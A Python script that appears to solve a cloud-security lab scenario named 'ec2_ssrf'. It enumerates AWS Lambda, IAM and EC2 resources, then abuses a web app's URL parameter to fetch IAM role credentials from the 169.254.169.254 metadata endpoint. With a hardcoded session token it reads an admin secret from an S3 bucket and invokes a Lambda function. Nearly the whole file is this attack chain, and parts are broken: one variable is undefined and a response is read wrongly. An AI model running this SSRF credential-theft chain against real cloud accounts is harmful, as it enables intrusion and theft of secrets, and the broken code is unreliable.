#scene4 ec2_ssrf
import boto3
from pprint import pprint
import requests
import json


lambda_session = boto3.session.Session(profile_name="solus")
lambda_cli = lambda_session.client(service_name='lambda')
pprint(lambda_cli.list_functions())
iam_cli = session.client(service_name='iam')
response0 = iam_cli.get_user()
response = iam_cli.list_user_policies(UserName='solus')
response1 = iam_cli.list_users()
print(response1)
pprint(lambda_cli.get_function(FunctionName='cg-lambda-cgida4jlib4nqw'))
ec2_session = boto3.session.Session(profile_name='vullambda')
ec2_cli = ec2_session.client(service_name='ec2')
pprint(ec2_cli.describe_instances())
url1 = 'http://ec2-xxxx-xx-xx.compute-1.amazonaws.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgida4jlib4nqw'
header = {'Host':'169.254.169.254', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
response = requests.get(url1)
ec2_role = str(response1.read().decode('utf-8'))
print(type(response.text))

token = "IQoJb3JpZ2luX2VjEPn//////////wEaCXVzLWVhc3QtMSJHMEUCIQDN2ojFA887zDNIRxPSTwg7jAY3LWo3gKp2XFetb0XSUwIgXC/B4naG7PAoirom70d4JlA/Vn1f+iKs2xzLnj6iPw4qtAMIURABGgw1Njc3OTY3NTY1ODciDFDXvX5sI3YS0OGWlCqRA+9wzGV2Qk2WxYqNKE8H4EcUtlFe2ZGeOQ2Mm3oXPfxb56CwKuCiCxA75yoIS70mA3WG+4DEPPTPAeRAhM0eOoScrJrRkUUNydBmE6xkurvCPI1MjHk/DcE+c3dkvHmYLU49xtbiYWjQsM8KXeFtmplUG25JqSoSGa5AFD0Q=="
access_key_id = "xxxsdf"
secret_access_key = "xcxvcb"
ec2_session = boto3.session.Session(aws_access_key_id=access_key_id, aws_secret_access_key=secret_access_key, aws_session_token=token)
s3_cli = ec2_session.client(service_name='s3')
# for bucket in s3_cli.list_buckets()['Buckets']:
#     print(bucket['Name'])

#obj = s3_cli.list_objects(Bucket='cg-secret-s3-bucket-cgida4jlib4nqw')
#pprint(obj)
response2 = s3_cli.get_object(Bucket='cg-secret-s3-bucket-cgida4jlib4nqw', Key='admin-user.txt')
r = response2['Body'].read().decode('utf-8')
print(r)
lambda_session = boto3.session.Session(profile_name="lambdafulladmin")
lambda_cli = lambda_session.client(service_name='lambda')
#pprint(lambda_cli.list_functions())
#print(lambda_cli.get_function(FunctionName='cg-lambda-cgida4jlib4nqw'))
lamb_res = lambda_cli.invoke(FunctionName='cg-lambda-cgida4jlib4nqw')
print(json.loads(lamb_res['Payload'].read().decode('utf-8')))
